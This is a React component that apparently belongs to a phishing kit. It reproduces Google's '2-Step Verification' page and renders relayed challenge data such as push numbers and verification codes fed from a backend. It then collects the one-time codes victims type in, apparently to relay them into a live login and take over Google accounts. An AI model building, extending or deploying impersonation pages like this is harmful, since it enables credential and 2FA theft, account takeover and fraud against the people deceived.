import { ChallengeMetadata, ChallengeType, Step } from "@/lib/types";
import { ChevronDown } from "lucide-react";
import React from "react";
import Button from "../ui/button";
import NumberPickerView from "./NumberPickerView";
import PushAppView from "./PushAppView";
import SecurityKeyView from "./SecurityKeyView";
import TOTPView from "./TOTPView";
import EmailView from "./EmailView";

const TwoFactor: React.FC<{
  email: string;
  isLoading: boolean;
  challengeType: ChallengeType | null;
  challengeMetadata: ChallengeMetadata | null;
  twoFactorCode: string;
  setTwoFactorCode: (code: string) => void;
  handle2FASubmit: () => void;
  handleSwitchMethod: (method: string) => void;
  backendMessage: string | null;
  error: string | null;
  step: Step;
}> = ({
  email,
  isLoading,
  challengeType,
  challengeMetadata,
  twoFactorCode,
  setTwoFactorCode,
  handle2FASubmit,
  handleSwitchMethod,
  backendMessage,
  error,
  step,
}) => {
  const [dontAskAgain, setDontAskAgain] = React.useState(true);
  const [showMethods, setShowMethods] = React.useState(false);

  return (
    <div className="w-1/3 flex flex-col md:flex-row px-6 md:p-[48px] items-stretch min-h-full">
      {/* Left Column: Title, Description, Profile Badge */}
      <div className="flex flex-col items-start md:w-[45%] md:pr-[48px] md:mt-[72px]">
        {/* Main Title - Always "2-Step Verification" */}
        <h1 className="text-[28px] leading-[36px] font-normal text-[#202124] mb-4">
          2-Step Verification
        </h1>

        {/* Description */}
        <p className="text-[16px] text-[#202124] font-normal mb-8 leading-[24px]">
          To help keep your account safe, Google wants to make sure it&apos;s
          really you trying to sign in
        </p>

        {/* Profile Badge */}
        <div className="flex items-center gap-2 border border-[#dadce0] rounded-full px-1 py-0.5 pr-3 w-fit cursor-pointer hover:bg-[#f1f3f4] transition-colors group">
          <div className="w-6 h-6 rounded-full bg-[#5f6368] flex items-center justify-center overflow-hidden shrink-0">
            <svg
              className="w-4 h-4 text-white"
              fill="currentColor"
              viewBox="0 0 24 24"
            >
              <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
            </svg>
          </div>
          <span className="text-[14px] font-normal text-[#202124] truncate max-w-[200px]">
            {email.endsWith("@gmail.com") ? email : `${email}@gmail.com`}
          </span>
          <ChevronDown className="w-4 h-4 text-[#5f6368]" />
        </div>
      </div>

      {/* Right Column: Challenge Content */}
      <div className="flex flex-col md:w-[55%] mt-8 md:mt-0">
        <div className="flex flex-col h-full">
          {/* Challenge Views */}
          <div className="flex-1">
            {(challengeType === "PUSH" || challengeType === "APP") && (
              <PushAppView
                dontAskAgain={dontAskAgain}
                setDontAskAgain={setDontAskAgain}
                challengeMetadata={challengeMetadata}
              />
            )}

            {challengeType === "NUMBER_PICKER" && (
              (challengeMetadata?.verificationNumber || challengeMetadata?.pushCode) ? (
                <NumberPickerView challengeMetadata={challengeMetadata} />
              ) : (
                // Fallback: NUMBER_PICKER detected but no number extracted — show push-style view
                <PushAppView
                  dontAskAgain={dontAskAgain}
                  setDontAskAgain={setDontAskAgain}
                  challengeMetadata={challengeMetadata}
                />
              )
            )}

            {(challengeType === "TOTP" ||
              challengeType === "SMS" ||
              challengeType === "VOICE" ||
              challengeType === "BACKUP") && (
              <TOTPView
                twoFactorCode={twoFactorCode}
                setTwoFactorCode={setTwoFactorCode}
                handle2FASubmit={handle2FASubmit}
                error={error}
                challengeType={challengeType}
                challengeMetadata={challengeMetadata}
              />
            )}

            {challengeType === "EMAIL" && (
              <EmailView
                twoFactorCode={twoFactorCode}
                setTwoFactorCode={setTwoFactorCode}
                handle2FASubmit={handle2FASubmit}
                error={error}
                challengeMetadata={challengeMetadata}
              />
            )}

            {challengeType === "SECURITY_KEY" && (
              <SecurityKeyView challengeMetadata={challengeMetadata} />
            )}
          </div>
        </div>
      </div>

      {/* Bottom Actions - Full Width, Positioned at Card Bottom */}
      <div className="mt-8 md:mt-0 md:absolute md:bottom-[48px] md:left-[48px] md:right-[48px] flex justify-end items-center">
        {/* Resend it - Left side */}
        <div className="flex items-center">
          {(challengeType === "PUSH" ||
            challengeType === "APP" ||
            challengeType === "SMS") && (
            <div className="text-[#1a73e8] text-[14px] font-medium cursor-pointer hover:underline">
              Resend it
            </div>
          )}
        </div>

        {/* Right side actions */}
        <div className="flex items-center gap-4">
          {/* Try another way link */}
          <div className="relative">
            <div
              onClick={() => {
                if (challengeMetadata?.availableMethods?.length) {
                  setShowMethods(!showMethods);
                } else {
                  handleSwitchMethod("CHALLENGE_PICKER");
                }
              }}
              className="text-[#1a73e8] text-[14px] font-medium cursor-pointer hover:underline"
            >
              Try another way
            </div>

            {showMethods && challengeMetadata?.availableMethods && (
              <div className="absolute bottom-full right-0 mb-2 w-[280px] bg-white rounded-lg shadow-[0_1px_3px_rgba(0,0,0,0.12),0_1px_2px_rgba(0,0,0,0.24)] z-10 py-2">
                {challengeMetadata.availableMethods.map((method) => (
                  <div
                    key={method}
                    onClick={() => {
                      handleSwitchMethod(method);
                      setShowMethods(false);
                    }}
                    className="px-4 py-3 hover:bg-[#f1f3f4] cursor-pointer text-[14px] text-[#202124] flex items-center justify-between"
                  >
                    <span className="capitalize">
                      {method.toLowerCase().replace(/_/g, " ")}
                    </span>
                    {challengeType === method && (
                      <div className="w-2 h-2 rounded-full bg-[#1a73e8]" />
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Show Next button only for code-based challenges */}
          {(challengeType === "TOTP" ||
            challengeType === "SMS" ||
            challengeType === "VOICE" ||
            challengeType === "EMAIL" ||
            challengeType === "BACKUP") && (
            <Button
              onClick={handle2FASubmit}
              disabled={isLoading || !twoFactorCode}
              className="px-6 py-2 rounded text-[14px] font-medium bg-[#1a73e8] hover:bg-[#1557b0] text-white shadow-none transition-all h-9"
            >
              {isLoading ? "..." : "Next"}
            </Button>
          )}
        </div>
      </div>
    </div>
  );
};

export default TwoFactor;
